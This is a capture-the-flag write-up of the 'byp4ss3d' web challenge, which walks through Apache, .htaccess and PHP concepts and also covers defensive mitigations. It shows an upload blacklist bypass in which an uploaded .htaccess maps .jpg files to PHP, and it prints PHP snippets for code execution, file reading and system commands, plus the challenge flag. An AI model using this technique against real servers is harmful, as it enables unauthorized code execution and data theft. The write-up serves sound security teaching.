# `byp4ss3d` — CTF Write-up & Apache `.htaccess` Deep Dive

> **Category:** Web Exploitation
> **Primary vulnerability:** Unrestricted file upload + Apache `.htaccess` abuse
> **Impact:** Arbitrary PHP code execution
> **Execution user:** `www-data`
> **Flag:** `academy{s3rv3r_byp4ss_a63b4ced}`

---

## 1. Overview

The `byp4ss3d` challenge demonstrates how a seemingly simple file-upload restriction can be bypassed when the **application's assumptions don't match the web server's behavior**.

The application attempted to prevent dangerous uploads by blocking several extensions:

```text
.php
.php3
.php4
.phtml
.zip
.txt
```

However, it allowed `.htaccess`.

Because Apache was configured to honor `.htaccess` files, we were able to upload an Apache configuration file into the application's upload directory.

We used:

```apache
AddType application/x-httpd-php .jpg
```

This changed how Apache handled `.jpg` files.

We could then upload a `.jpg` containing PHP code and have Apache execute it.

The resulting chain was:

```text
File Upload
     ↓
.htaccess Upload
     ↓
Apache Configuration Modification
     ↓
.jpg → PHP
     ↓
PHP Code Execution
     ↓
www-data
     ↓
Filesystem Enumeration
     ↓
/var/www/flag.txt
     ↓
Flag
```

---

# 2. Learning Objectives

This challenge teaches several concepts that are useful beyond this specific CTF:

* Apache architecture
* Apache `.htaccess`
* Apache `DocumentRoot`
* Apache MIME types and handlers
* `AddType`
* PHP execution
* File-upload vulnerabilities
* Extension blacklists
* Server/application interpretation differences
* Linux permissions
* `www-data`
* Filesystem enumeration
* Web-root enumeration
* Source-code analysis

---

# 3. Initial Application Structure

The application exposed an upload endpoint:

```text
/upload.php
```

Uploaded files were stored under:

```text
/images/
```

The initial architecture could be represented as:

```text
             Browser
                |
                | POST /upload.php
                v
          +-------------+
          |  Apache     |
          +-------------+
                |
                v
          upload.php
                |
                v
        Validate filename
                |
                v
          /images/
```

The important question was:

> What exactly does the application validate, and what will Apache actually do with the uploaded file?

---

# 4. Source-Code Analysis

The upload code was:

```php
<?php
if (isset($_FILES['image'])) {
    $filename = $_FILES['image']['name'];
    $tmp = $_FILES['image']['tmp_name'];

    $parts = explode('.', $filename);
    $ext = strtolower(end($parts));

    $blacklist = array("php", "php3", "phtml", "php4", "zip", "txt");

    if (in_array($ext, $blacklist)) {
        echo "Not allowed!";
        exit(0);
    }

    $destination = "images/" . basename($filename);

    if (move_uploaded_file($tmp, $destination)) {
        echo "Successfully uploaded!<br>";
        echo "Access it at: <a href='$destination'>$destination</a>";
    } else {
        echo "Upload failed.";
    }

    exit(0);
}
?>
```

---

# 5. Understanding the Extension Check

The application extracted the extension with:

```php
$parts = explode('.', $filename);
$ext = strtolower(end($parts));
```

For example:

```text
test.jpg
```

becomes:

```text
["test", "jpg"]
```

and:

```text
jpg
```

becomes the extension.

The blacklist was:

```php
$blacklist = array(
    "php",
    "php3",
    "phtml",
    "php4",
    "zip",
    "txt"
);
```

Therefore:

```text
test.php       → blocked
test.php3      → blocked
test.phtml     → blocked
test.zip       → blocked
test.txt       → blocked
test.jpg       → allowed
```

The important problem was that this validation only considered the **filename extension**.

It did not establish that the uploaded file was actually a safe image.

---

# 6. Why Blacklists Are Dangerous

A blacklist asks:

> "Is this particular extension dangerous?"

A stronger security model asks:

> "What files should be allowed, where should they be stored, and can the server execute them?"

Those are very different questions.

The challenge allowed:

```text
.htaccess
```

even though `.htaccess` could influence Apache behavior.

This created a path around the application's intended security model.

---

# 7. What Is Apache?

Apache HTTP Server is a web server.

Its basic responsibility is:

```text
HTTP Request
      ↓
Apache
      ↓
Find resource
      ↓
Determine how resource should be handled
      ↓
Return response
```

For example:

```http
GET /images/cat.jpg HTTP/1.1
Host: target
```

Apache has to determine:

```text
Which website?
Which directory?
Which file?
What configuration applies?
What handler should process the file?
```

A simplified model is:

```text
                    HTTP Request
                         |
                         v
                 VirtualHost selection
                         |
                         v
                  URL → filesystem
                         |
                         v
                  Directory config
                         |
                         v
                    .htaccess
                         |
                         v
                  File processing
                         |
                         v
                     Response
```

Understanding this pipeline is extremely important for web CTFs.

---

# 8. `DocumentRoot`

Apache commonly has a configuration such as:

```apache
DocumentRoot /var/www/html
```

This means the web application's filesystem root is:

```text
/var/www/html
```

Therefore:

```text
HTTP:

/images/test.jpg
```

maps conceptually to:

```text
Filesystem:

/var/www/html/images/test.jpg
```

In our challenge we confirmed:

```text
DOCUMENT ROOT: /var/www/html
```

and:

```text
PWD: /var/www/html/images
```

So the mapping was:

```text
/images/test.jpg
        ↓
/var/www/html/images/test.jpg
```

---

# 9. What Is `.htaccess`?

`.htaccess` is a **directory-level Apache configuration file**.

Instead of changing the main Apache configuration, a site can place configuration inside a directory.

For example:

```text
/var/www/html/
│
├── index.php
│
└── images/
    │
    ├── .htaccess
    ├── cat.jpg
    └── dog.jpg
```

The `.htaccess` inside `images` can affect requests for resources under that directory, subject to Apache's `AllowOverride` configuration.

This is why uploading `.htaccess` can be dangerous.

An attacker isn't merely uploading data.

They're potentially uploading:

```text
SERVER CONFIGURATION
```

---

# 10. `AllowOverride`

One important Apache directive is:

```apache
AllowOverride
```

It determines what `.htaccess` files are allowed to override.

For example:

```apache
<Directory /var/www/html>
    AllowOverride None
</Directory>
```

means `.htaccess` overrides are disabled.

Conceptually:

```text
.htaccess
    ↓
ignored
```

Whereas configurations permitting relevant overrides allow `.htaccess` directives to take effect.

This creates an important CTF question:

> **Can `.htaccess` actually influence this directory?**

In `byp4ss3d`, it could.

---

# 11. `AddType`

Our `.htaccess` contained:

```apache
AddType application/x-httpd-php .jpg
```

This was the key configuration.

Conceptually, we changed Apache's interpretation of `.jpg`.

Normally:

```text
.jpg
 ↓
image/jpeg
```

After our configuration:

```text
.jpg
 ↓
PHP-related processing
```

Therefore:

```text
test.jpg
```

could contain:

```php
<?php
echo "hello";
?>
```

and Apache would process it as PHP.

---

# 12. Why This Worked

The application checked:

```text
test.jpg
```

and said:

```text
.jpg = allowed
```

Apache then processed the same file according to its configuration:

```text
.jpg = PHP
```

So we had:

```text
             Application
                 |
                 | ".jpg is safe"
                 v
              Upload
                 |
                 v
              Apache
                 |
                 | ".jpg is PHP"
                 v
            PHP execution
```

The vulnerability was therefore caused by **inconsistent assumptions between components**.

---

# 13. MIME Type vs Handler

This distinction is important for advanced Apache work.

A MIME type essentially describes what kind of content a resource represents.

For example:

```text
image/jpeg
text/html
application/json
```

A handler determines what component should process a request.

In real Apache configurations you'll encounter concepts such as:

```apache
AddType
AddHandler
SetHandler
```

They shouldn't simply be memorized as interchangeable directives.

The important question is:

> **What processing path will Apache ultimately use for this resource?**

That is what matters from a security perspective.

---

# 14. Apache Modules

Apache functionality is divided into modules.

Some particularly important modules for web security research are:

### `mod_mime`

Related to MIME/type mappings.

Useful concepts:

```apache
AddType
AddHandler
```

---

### `mod_rewrite`

Extremely important.

You'll encounter:

```apache
RewriteEngine On
RewriteRule ...
RewriteCond ...
```

It can transform requests such as:

```text
/request
    ↓
/index.php
```

This is heavily used by modern applications and frameworks.

Understanding rewrite rules is essential for:

* routing
* access-control analysis
* hidden endpoints
* path normalization
* proxy configurations

---

### `mod_proxy`

Important for Apache acting as a reverse proxy.

Architecture:

```text
Client
  |
  v
Apache
  |
  | proxy
  v
Backend application
```

This becomes particularly important when studying:

* reverse proxies
* SSRF
* request routing
* proxy misconfiguration
* frontend/backend inconsistencies

---

### `mod_headers`

Allows manipulation of HTTP headers.

For example:

```apache
Header set ...
```

This becomes useful when studying:

* security headers
* authentication behavior
* caching
* proxy behavior

---

# 15. Apache VirtualHosts

Apache can host multiple websites on one server.

For example:

```apache
<VirtualHost *:80>
    ServerName site1.local
    DocumentRoot /var/www/site1
</VirtualHost>

<VirtualHost *:80>
    ServerName site2.local
    DocumentRoot /var/www/site2
</VirtualHost>
```

The request:

```http
Host: site1.local
```

can reach:

```text
/var/www/site1
```

while:

```http
Host: site2.local
```

can reach:

```text
/var/www/site2
```

This is why **Host headers and VirtualHosts** are important topics for harder web CTFs.

---

# 16. Apache + PHP

Another important concept:

> Apache itself is not PHP.

There is a processing chain.

One common architecture is:

```text
Browser
   |
   v
Apache
   |
   | FastCGI
   v
PHP-FPM
   |
   v
PHP application
```

Another environment can use different PHP integration.

Therefore, when investigating PHP execution, ask:

```text
Who receives the request?
        ↓
Apache
        ↓
What handler?
        ↓
PHP
        ↓
Which process/user?
        ↓
www-data
```

This becomes very important after obtaining code execution.

---

# 17. Confirming Code Execution

We created:

```text
test.jpg
```

with:

```php
<?php
echo "PHP_EXECUTION_SUCCESS";
?>
```

After uploading:

```text
/images/test.jpg
```

the server returned:

```text
PHP_EXECUTION_SUCCESS
```

This proved:

```text
Upload
   ↓
Apache
   ↓
PHP
   ↓
Execution
```

rather than simply serving the file as an image.

---

# 18. Determining Execution Context

We then used:

```php
<?php
echo "Current directory: " . getcwd();
?>
```

Result:

```text
/var/www/html/images
```

We also confirmed:

```text
SCRIPT: /var/www/html/images/test1.jpg
DOCUMENT ROOT: /var/www/html
```

This distinction is important:

```text
DocumentRoot
    =
web application's filesystem root
```

while:

```text
getcwd()
    =
current working directory of the executing process
```

They aren't necessarily the same thing.

---

# 19. Enumerating the Upload Directory

We used the equivalent of:

```bash
ls -la
```

and found:

```text
.htaccess
test.jpg
test1.jpg
```

The directory was associated with:

```text
www-data
```

This told us that the web application was operating under a non-root service account.

---

# 20. `www-data`

On many Linux web servers, web applications run as a restricted user such as:

```text
www-data
```

This is an important security boundary.

Getting PHP execution does **not** automatically mean:

```text
root
```

Instead:

```text
Attacker code
     ↓
PHP
     ↓
www-data
     ↓
Linux permissions
```

What happens next depends heavily on filesystem and process permissions.

---

# 21. Linux Permissions

We found:

```text
-rw-r--r-- root root flag.txt
```

Breakdown:

```text
-rw-r--r--
```

means:

```text
Owner:  rw-
Group:  r--
Others: r--
```

So:

```text
root
```

could read/write.

The group could read.

Other users could read.

Since the PHP process was running as:

```text
www-data
```

and `www-data` wasn't the owner or relevant group, it fell under:

```text
others
```

and therefore had read access.

This allowed:

```text
www-data
      ↓
read
      ↓
/var/www/flag.txt
```

---

# 22. The `/challenge` Permission Denied

During enumeration, `/challenge` existed:

```text
/challenge
```

but accessing it produced:

```text
Permission denied
```

This was an important lesson.

A compromised process doesn't automatically have unrestricted filesystem access.

Instead:

```text
PHP
 ↓
www-data
 ↓
Linux permissions
```

still applies.

We therefore continued enumerating accessible locations rather than assuming the flag had to be inside `/challenge`.

---

# 23. Finding `/var/www/flag.txt`

From:

```text
/var/www/html/images
```

we moved upward:

```text
/var/www/html/images
          ↓
/var/www/html
          ↓
/var/www
```

The `/var/www` directory contained:

```text
flag.txt
html
```

We therefore identified:

```text
/var/www/flag.txt
```

---

# 24. Reading the Flag

PHP was used to read:

```text
/var/www/flag.txt
```

The result was:

```text
academy{s3rv3r_byp4ss_a63b4ced}
```

---

# 25. Full Attack Chain

```text
┌──────────────────────────────┐
│       Web Application        │
└──────────────┬───────────────┘
               │
               ▼
         /upload.php
               │
               ▼
      Extension blacklist
               │
               │ .htaccess allowed
               ▼
        /images/.htaccess
               │
               ▼
   AddType ... .jpg → PHP
               │
               ▼
          test.jpg
               │
               ▼
       PHP code execution
               │
               ▼
            www-data
               │
               ▼
       Filesystem enumeration
               │
               ▼
        /var/www/flag.txt
               │
               ▼
             FLAG
```

---

# 26. Why the Vulnerability Exists

The core problem can be summarized as:

```text
Application security model
          ≠
Apache security model
```

The application said:

```text
.jpg = allowed
```

Apache was configured to say:

```text
.jpg = PHP
```

Therefore:

```text
"Allowed file"
       +
"Executable interpretation"
       =
Code execution
```

---

# 27. Important Security Principle

When testing web applications, never stop at:

> "What extension does the application allow?"

Also ask:

> "What does the web server do with that extension?"

And:

> "Can an attacker influence the server's configuration?"

And finally:

> "Which OS user executes the result?"

This gives a much better model:

```text
Filename
   ↓
Application validation
   ↓
Apache configuration
   ↓
Handler
   ↓
Interpreter
   ↓
OS user
   ↓
Filesystem permissions
```

---

# 28. Defensive Mitigation

A secure implementation should use multiple layers of protection.

### 1. Don't rely on an extension blacklist

Instead of only:

```php
if ($ext == "php") ...
```

use a positive allowlist and proper content validation.

---

### 2. Rename uploaded files

Don't trust:

```php
$_FILES['image']['name']
```

as the final server-side filename.

Generate a random server-side name.

For example:

```text
uploaded image
      ↓
random server filename
      ↓
stored object
```

---

### 3. Keep uploads outside executable web directories

Prefer something conceptually like:

```text
/var/www/uploads/
```

with appropriate server configuration rather than allowing uploaded files to become executable resources.

---

### 4. Disable unnecessary `.htaccess` overrides

Where appropriate:

```apache
AllowOverride None
```

can prevent directory users from changing configuration through `.htaccess`.

---

### 5. Prevent script execution in upload directories

Even if an attacker manages to upload:

```text
something.php
```

the server should not execute it.

---

### 6. Apply least privilege

The web application should only have access to files it genuinely needs.

---

### 7. Protect sensitive files

Sensitive files should not be readable by arbitrary service accounts.

---

# 29. CTF Methodology Learned

This challenge demonstrates a useful workflow:

```text
1. Enumerate application
        ↓
2. Find upload functionality
        ↓
3. Inspect source
        ↓
4. Understand validation
        ↓
5. Identify assumptions
        ↓
6. Study server configuration
        ↓
7. Test controlled execution
        ↓
8. Identify execution context
        ↓
9. Enumerate filesystem
        ↓
10. Analyze permissions
        ↓
11. Locate objective
        ↓
12. Retrieve flag
```

---

# 30. Commands / Techniques Practiced

### Local enumeration

```bash
ls -la
```

### PHP working directory

```php
getcwd()
```

### PHP script location

```php
__FILE__
```

### Document root

```php
$_SERVER['DOCUMENT_ROOT']
```

### Directory enumeration

```php
scandir(".")
```

### Server command execution in the lab

```php
system("ls -la")
```

### File reading

```php
file_get_contents("/var/www/flag.txt")
```

These techniques are useful for understanding **post-exploitation behavior in an authorized CTF/lab environment**.

---

# 31. Key Takeaways

### Apache

```text
Apache isn't just "the thing serving HTML."

It is a configurable request-processing engine.
```

### `.htaccess`

```text
.htaccess can modify Apache behavior at directory level.
```

### Uploads

```text
An uploaded file is dangerous if the server can interpret it
as configuration or executable code.
```

### PHP

```text
PHP execution happens under an OS account.
```

### Linux

```text
Code execution does not automatically mean root.
```

### Exploitation

```text
The most interesting vulnerabilities often occur
when two components make different assumptions.
```

---

# 33. Final Flag

```text
academy{s3rv3r_byp4ss_a63b4ced}
```